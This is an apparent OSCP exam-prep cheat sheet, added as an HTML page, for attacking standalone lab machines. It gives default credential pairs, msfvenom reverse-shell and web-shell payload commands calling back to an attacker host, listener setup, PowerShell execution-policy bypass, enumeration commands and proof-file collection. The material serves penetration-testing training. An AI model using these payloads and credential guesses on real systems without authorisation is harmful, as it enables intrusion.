@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Standalone Machines | Psalm OSCP</title>
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --bg2: #0d1117;
+      --card: #161b22;
+      --code-bg: #10151e;
+      --border: #21262d;
+      --border2: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --dim: #6e7681;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --yellow: #d29922;
+      --red: #f85149;
+      --purple: #bc8cff;
+      --mono: 'Courier New', Courier, monospace;
+      --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.6; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* NAV */
+    .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 0.85rem 2rem; background: var(--bg2); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+    .logo { font-family: var(--mono); font-size: 1.05rem; color: var(--accent); font-weight: 700; }
+    .back-link { font-size: 0.82rem; color: var(--muted); border: 1px solid var(--border2); padding: 4px 12px; border-radius: 6px; transition: all 0.2s; }
+    .back-link:hover { background: var(--card); color: var(--text); text-decoration: none; }
+
+    /* LAYOUT */
+    .page { display: flex; max-width: 1380px; margin: 0 auto; }
+
+    /* SIDEBAR */
+    .sidebar { width: 230px; flex-shrink: 0; padding: 2rem 1rem 2rem 1.5rem; position: sticky; top: 54px; height: calc(100vh - 54px); overflow-y: auto; border-right: 1px solid var(--border); }
+    .sidebar-label { font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--dim); margin-bottom: 0.6rem; padding-bottom: 0.3rem; border-bottom: 1px solid var(--border); }
+    .sidebar ul { list-style: none; }
+    .sidebar li { margin-bottom: 1px; }
+    .sidebar li a { display: block; font-size: 0.8rem; color: var(--muted); padding: 4px 8px; border-radius: 4px; font-family: var(--mono); transition: all 0.15s; }
+    .sidebar li a:hover { background: var(--card); color: var(--accent); text-decoration: none; }
+    .sidebar-group { margin-top: 1.1rem; }
+    .sidebar-group-lbl { font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--dim); padding: 2px 8px; margin-bottom: 2px; display: block; }
+
+    /* MAIN */
+    .main { flex: 1; padding: 2rem 2.5rem 5rem; min-width: 0; }
+    .page-title { font-size: 1.9rem; font-weight: 700; margin-bottom: 0.4rem; }
+    .page-sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 2.5rem; }
+
+    /* SECTIONS */
+    .sec { margin-bottom: 3rem; }
+    .sec-head { display: flex; align-items: center; gap: 10px; margin-bottom: 1.2rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+    .sec-head h2 { font-size: 1.2rem; font-weight: 600; }
+
+    /* CODE BLOCKS */
+    .cb { margin: 0.75rem 0; border: 1px solid var(--border2); border-radius: 8px; overflow: hidden; }
+    .cb-head { display: flex; align-items: center; justify-content: space-between; padding: 5px 13px; background: var(--card); border-bottom: 1px solid var(--border); gap: 8px; flex-wrap: wrap; }
+    .cb-lbl { font-size: 0.73rem; font-family: var(--mono); color: var(--muted); }
+    .cb-tags { display: flex; gap: 5px; margin-left: auto; }
+    .tag { font-size: 0.65rem; padding: 1px 7px; border-radius: 4px; font-family: var(--mono); border: 1px solid var(--border2); color: var(--dim); }
+    .t-your { border-color: #d2992255; color: var(--yellow); background: #d2992212; }
+    .t-crit { border-color: #f8514955; color: var(--red); background: #f8514912; }
+    .t-win  { border-color: #58a6ff55; color: var(--accent); background: #58a6ff12; }
+    .t-lin  { border-color: #3fb95055; color: var(--green); background: #3fb95012; }
+    .t-ad   { border-color: #bc8cff55; color: var(--purple); background: #bc8cff12; }
+    .cpb { font-size: 0.68rem; padding: 2px 9px; background: transparent; border: 1px solid var(--border2); border-radius: 4px; color: var(--dim); cursor: pointer; font-family: var(--mono); white-space: nowrap; transition: all 0.15s; }
+    .cpb:hover { background: var(--code-bg); color: var(--muted); }
+    pre { background: var(--code-bg); padding: 12px 15px; font-family: var(--mono); font-size: 0.8rem; line-height: 1.85; overflow-x: auto; color: var(--text); white-space: pre; }
+    .c  { color: var(--dim); }
+    .h  { color: var(--green); }
+    .w  { color: var(--yellow); }
+    .e  { color: var(--red); }
+
+    /* CALLOUTS */
+    .note  { padding: 9px 13px; border-radius: 6px; margin: 0.6rem 0; font-size: 0.83rem; line-height: 1.6; font-family: var(--mono); }
+    .n-info  { background: #1f6feb14; border: 1px solid #1f6feb44; color: #58a6ff; }
+    .n-warn  { background: #d2992214; border: 1px solid #d2992244; color: var(--yellow); }
+    .n-bad   { background: #f8514914; border: 1px solid #f8514944; color: var(--red); }
+    .n-good  { background: #3fb95014; border: 1px solid #3fb95044; color: var(--green); }
+
+    /* SIGNAL BOX */
+    .sig { background: var(--code-bg); border: 1px solid var(--border2); border-left: 3px solid var(--yellow); border-radius: 6px; padding: 11px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.95; }
+    .sig-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--yellow); margin-bottom: 7px; display: block; }
+    .so { color: var(--muted); }
+    .sa { color: var(--green); }
+
+    /* GRID */
+    .two { display: grid; grid-template-columns: 1fr 1fr; gap: 0.9rem; }
+    @media(max-width:880px) { .sidebar{display:none;} .main{padding:1.2rem;} .two{grid-template-columns:1fr;} }
+
+    /* FOOTER */
+    footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
+
+    /* COPY JS */
+  </style>
+  <script>
+    function cp(btn) {
+      const pre = btn.closest('.cb').querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const o = btn.textContent; btn.textContent = '✓ copied';
+        setTimeout(() => btn.textContent = o, 1500);
+      });
+    }
+  </script>
+</head><body>
+<nav class="top-nav">
+  <a class="logo" href="https://difficultsnow.github.io/PT-toolkit-main/index.html">&lt;DifficultSnow/&gt;</a>
+  <a class="back-link" href="index.html">← Psalm OSCP Methodology</a>
+</nav>
+<div class="page">
+  <aside class="sidebar">
+    <div class="sidebar-label">On This Page</div>
+    <ul>
+      <li><a href="#flow">First 15 Min Flow</a></li>
+      <li><a href="#defaults">Default Creds</a></li>
+      <li><a href="#shells">Shell Generation</a></li>
+      <li><a href="#stabilize">Shell Stabilization</a></li>
+      <li><a href="#stuck">Stuck Checklist</a></li>
+      <li><a href="#msf">Metasploit</a></li>
+      <li><a href="#proof">Proof Collection</a></li>
+    </ul>
+  </aside>
+  <main class="main">
+    <h1 class="page-title">🖥️ Standalone Machines</h1>
+    <p class="page-sub">3 standalones × up to 20pts each. You only need 2 fully rooted + the AD set to pass. Always document low-priv shell even if no root — partial credit counts.</p>
+
+    <section class="sec" id="flow">
+      <div class="sec-head"><h2>First 15 Minutes — Decision Flow</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">structured approach before touching exploits</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># 1. Scans are already running (started at exam begin)</span>
+<span class="c"># 2. Read ALL nmap output before picking a vector</span>
+<span class="c"># 3. searchsploit EVERY service + version found:</span>
+searchsploit &lt;service&gt; &lt;version&gt;
+searchsploit -x &lt;path&gt;    <span class="c"># read without copying</span>
+searchsploit -m &lt;path&gt;    <span class="c"># copy to cwd</span>
+searchsploit --cve &lt;CVE&gt;
+
+<span class="c"># 4. Try default creds on every service with auth (see defaults below)</span>
+<span class="c"># 5. Web? → gobuster it immediately</span>
+<span class="c"># 6. SMB? → null session, shares, vuln scan</span>
+<span class="c"># 7. DB exposed? → default creds, version CVEs</span></pre></div>
+    </section>
+
+    <section class="sec" id="defaults">
+      <div class="sec-head"><h2>Default Credential Matrix</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">try on everything with auth</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>admin:admin           admin:password        admin:admin123
+admin:                root:root             root:toor
+root:                 root:password         guest:guest
+&lt;service&gt;:&lt;service&gt;   <span class="c"># postgres:postgres  oracle:oracle  tomcat:tomcat</span>
+&lt;hostname&gt;:&lt;hostname&gt; <span class="c"># machine or company name as password</span>
+&lt;username&gt;:&lt;username&gt; <span class="c"># username same as password</span>
+administrator:Password123    administrator:Welcome1
+tomcat:s3cret         sa:sa    sa:password    pi:raspberry</pre></div>
+    </section>
+
+    <section class="sec" id="shells">
+      <div class="sec-head"><h2>Shell Generation — msfvenom</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">all formats</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Linux ELF:</span>
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f elf -o shell32.elf
+
+<span class="c"># Windows EXE:</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o shell64.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o shell32.exe
+
+<span class="c"># Web shells:</span>
+msfvenom -p php/reverse_php LHOST=&lt;KALI&gt; LPORT=4444 -f raw -o shell.php
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f asp -o shell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f aspx -o shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f war -o shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f raw -o shell.jsp
+
+<span class="c"># Staged (use with MSF handler):</span>
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o staged.exe</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">listeners</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>rlwrap nc -lvnp 4444
+rlwrap nc -lvnp 443   <span class="c"># use 443 if 4444 is filtered</span>
+pwncat-cs -lp 4444    <span class="c"># auto-stabilizes + file transfer built in</span>
+
+<span class="c"># MSF handler:</span>
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST &lt;KALI&gt;; set LPORT 4444; run"</pre></div>
+    </section>
+
+    <section class="sec" id="stabilize">
+      <div class="sec-head"><h2>Shell Stabilization — Do Immediately Every Time</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">Linux — python pty method</span><div class="cb-tags"><span class="tag t-lin">linux</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>which python3 python python2
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+<span class="c"># If no python:</span>
+script /dev/null -c bash
+<span class="c"># Then:</span>
+export TERM=xterm
+<span class="c"># Press Ctrl+Z (background the shell)</span>
+stty raw -echo; fg
+<span class="c"># Press Enter once or twice</span>
+stty rows 50 cols 220</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">Windows — upgrade to PowerShell</span><div class="cb-tags"><span class="tag t-win">windows</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>powershell -ep bypass
+powershell -nop -ep bypass
+<span class="c"># Check AV/AMSI before running tools:</span>
+Get-MpComputerStatus | Select AMServiceEnabled,AntispywareEnabled</pre></div>
+    </section>
+
+    <section class="sec" id="stuck">
+      <div class="sec-head"><h2>Stuck? — 30 Minute Checklist</h2></div>
+      <div class="note n-warn">If no progress in 30 minutes, rotate to another target. Return with fresh eyes.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">run through before giving up on a target</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># 1. ALL ports scanned? (including UDP):</span>
+sudo nmap -p- --min-rate 5000 &lt;IP&gt;
+sudo nmap -sU --top-ports 25 &lt;IP&gt;
+
+<span class="c"># 2. Virtual hosts?</span>
+gobuster vhost -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+
+<span class="c"># 3. All file extensions tried?</span>
+gobuster dir -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
+  -x php,asp,aspx,txt,bak,zip,tar,sql,conf,xml,old
+
+<span class="c"># 4. All collected creds tried on ALL services?</span>
+<span class="c"># 5. linpeas/winpeas read fully top to bottom (not skimmed)?</span>
+<span class="c"># 6. Page source code checked?</span>
+<span class="c"># 7. searchsploit minor versions? (e.g. "openssh 7.2" not just "openssh")</span>
+<span class="c"># 8. Any new usernames from web/SNMP/LDAP tried everywhere?</span>
+<span class="c"># 9. Non-standard port behavior checked?</span>
+<span class="c"># 10. pspy running to catch background processes?</span></pre></div>
+    </section>
+
+    <section class="sec" id="msf">
+      <div class="sec-head"><h2>Metasploit — Use Once, Use Wisely</h2></div>
+      <div class="note n-bad">Metasploit can only be used on ONE target machine. Cannot be used for pivoting. Save it for the target where manual exploitation fails or costs too much time.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">basic workflow</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>msfconsole -q
+search &lt;service&gt; &lt;version&gt;
+use &lt;module_path&gt;
+show options
+set RHOSTS &lt;IP&gt;
+set LHOST &lt;KALI&gt;
+set LPORT 4444
+run</pre></div>
+    </section>
+
+    <section class="sec" id="proof">
+      <div class="sec-head"><h2>Proof Collection</h2></div>
+      <div class="note n-info">Screenshot: proof.txt + whoami/id + hostname in ONE terminal window. Do this immediately after rooting — before moving on.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">Linux root proof</span><div class="cb-tags"><span class="tag t-lin">linux</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>id &amp;&amp; hostname &amp;&amp; ip a &amp;&amp; cat /root/proof.txt</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">Windows admin/system proof</span><div class="cb-tags"><span class="tag t-win">windows</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>whoami &amp;&amp; hostname &amp;&amp; ipconfig /all &amp;&amp; type C:\Users\Administrator\Desktop\proof.txt
+<span class="c"># Alt path:</span>
+type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
+<span class="c"># Low-priv partial credit:</span>
+whoami &amp;&amp; hostname &amp;&amp; type C:\Users\&lt;user&gt;\Desktop\local.txt</pre></div>
+    </section>
+
+  </main>
+</div>
+<footer>&lt;DifficultSnow/&gt; | Psalm OSCP Methodology</footer>
+</body></html>
